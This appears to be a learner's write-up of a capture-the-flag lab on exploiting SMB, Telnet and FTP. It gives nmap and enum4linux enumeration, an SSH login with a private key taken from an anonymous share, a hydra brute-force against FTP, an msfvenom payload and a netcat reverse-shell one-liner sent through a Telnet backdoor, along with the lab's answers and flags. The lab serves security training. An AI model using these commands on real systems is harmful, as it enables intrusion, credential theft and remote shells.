Network Services 1
==================

## 1. Get Connected

_Ready? Let's get going!_

> N/A

## 2. Understanding SMB

- SMB = command: Server Message Block Protocol
  - Share files, printers, serial ports, named pipes, APIs.
  - Client-server, request-response.
  - NetBIOS over TCP/IP, NetBEUI, IPX/SPX.
- Windows, Samba.

### (1)

_What does SMB stand for?_

>Server Message Block

### (2)

_What type of protocol is SMB?_

> response-request

### (3)

_What do clients connect to servers using?_

> TCP/IP

### (4)

_What systems does Samba run on?_

> Unix

## 3. Enumerataing SMB

- https://github.com/CiscoCXSecurity/enum4linux
  - https://github.com/cddmp/enum4linux-ng
  - Install dependencies: `sudo pacman -Sy samba`
    - `polenum`: Extract password policy info from a windows machine.
    - `ldapsearch`: Part of `openldap` for enumeration.
  - Install: `git clone <url>`
- `./enum4linux.pl -a $IP`

### (1)

_Conduct an nmap scan of your choosing, How many ports are open?_

`nmap $IP`

> 3

### (2)

_What ports is SMB running on?_

> 139/445

### (3)

_Let's get started with Enum4Linux, conduct a full basic enumeration.
For starters, what is the workgroup name?_

> WORKGROUP

### (4)

_What comes up as the name of the machine?_

> POLOSMB

### (5)

_What operating system version is running?_

> 6.1

### (6)

_What share sticks out as something we might want to investigate?_

> profiles

## 4. Exploiting SMB

### (1)

_What would be the correct syntax to access an SMB share called "secret" as user
"suit" on a machine with the IP 10.10.10.2 on the default port?_

> smbclient //10.10.10.2/secret -U suit

### (2)

_Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability.
You have a list of users, the name of the share (smb) and a suspected vulnerability._

> N/A

### (3)

_Does the share allow anonymous access? Y/N?_


Lets see if our interesting share has been configured to allow anonymous access, i.e.
it doesn't require authentication to view the files. We can do this easily by:
- using the username "Anonymous"
- connecting to the share we found during the enumeration stage
- and not supplying a password.

`smbclient //$IP/profiles -U Anonymous` and Enter.

> Y

### (4)

_Great! Have a look around for any interesting documents that could contain
valuable information. Who can we assume this profile folder belongs to?_

- `ls`
- `?`
- `more "Working From Home Information.txt"`

> John Cactus

### (5)

_What service has been configured to allow him to work from home?_

> SSH

### (6)

_Okay! Now we know this, what directory on the share should we look in?_

> .ssh

### (7) 

_This directory contains authentication keys that allow a user to authenticate
themselves on, and then access, a server. Which of these keys is most useful to us?_

> id_rsa

### (8)

_What is the smb.txt flag?_

Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
Now, use the information you have already gathered to work out the username of the account.
Then, use the service and key to log-in to the server.

- `cd .ssh`
- `more id_rsa.pub`: User seems to be `cactus`.
- `get id_rsa`
- `exit`
- `chmod 600`
- `ssh -i id_rsa cactus@$IP "cat ~/smb.txt"`

> THM{smb_is_fun_eh?}

## 5. Understanding Telnet

- Protocol to execute commands on remote machines.
- Cleartext.
- `telnet [ip] [port]`

1. Application protocol
2. SSH
3. telnet 10.10.10.3 23
4. encryption

## 6. Enumerating Telnet

1. 1
  * `ping $IP`
  * `nmap $IP`
  * `nmap -p- $IP`
2. 8012
3. TCP
  * Unassigned: unknown service listening.
4. 0
5. N/A
6. a backdoor
  * `nmap -p8012 -sV $IP`
  * `sudo pacman -Sy inetutils`
  * `telnet $IP 8012`
7. SKIDY
8. N/A

## 7. Exploiting Telnet

CVE: Common Vulnerabilities and Exposures

1. N/A
  * `telnet $IP 8012`
2. SKIDY'S BACKDOOR
3. N
4. N/A
5. N/A
6. Y
  * `sudo pacman -Sy tcpdump`
  * `sudo tcpdump ip proto \\icmp -i tun0`
  * `.RUN ping $VPNIP -c 1`: We received the ping!
7. N/A
8. mkfifo
  * `sudo pacman -Sy metasploit`
  * `ip -o addr list tun0`
  * `msfvenom -p cmd/unix/reverse_netcat lhost=$VPNIP lport=4444 R`
9. nc -lvp 4444
10. N/A
  * `telnet $IP 8012`
  * `.RUN mkfifo /tmp/favfuh; nc $VPNIP 4444 0</tmp/favfuh | /bin/sh >/tmp/favfuh 2>&1; rm /tmp/favfuh`
11. `THM{y0u_g0t_th3_t3ln3t_fl4g}`
  * `cat flag.txt`
  * `.EXIT`

## 8. Understanding FTP

- File Transfer Protocol (RFC959)
  - Command (control) + data channels
- Active FTP: client listens, server connects.
- Passive FTP: server listens, client connects.

1. client-server
2. 21
3. 2

## 9. Enumerating FTP

1. 2
  * `nmap -p- $IP`
  * Actually, nmap only found 1!
2. 21
3. vsftpd
  * `nmap -p21 -sV $IP`
4. `PUBLIC_NOTICE.txt`
  * `ftp $IP` and `anonymous` and Enter.
  * `ls`
5. Mike
  * `get PUBLIC_NOTICE.txt` and `cat` locally.
6. N/A

## 10. Exploiting FTP

Unencrypted: can be sniffed.

1. password
  * `sudo pacman -Sy hydra`
  * Download `rockyou.txt`.
  * `hydra -t 4 -l mike -P ./rockyou.txt -vV $IP ftp`
2. N/A
  * `ftp $IP` and `mike` and the password.
3. `THM{y0u_g0t_th3_ftp_fl4g}`
  * `ls`
  * `get ftp.txt` and `cat` locally.
  * `quit`

## 11. Expanding Your Knowledge

- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
- https://attack.mitre.org/techniques/T1210/
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

_Well done, you did it!_

> N/A
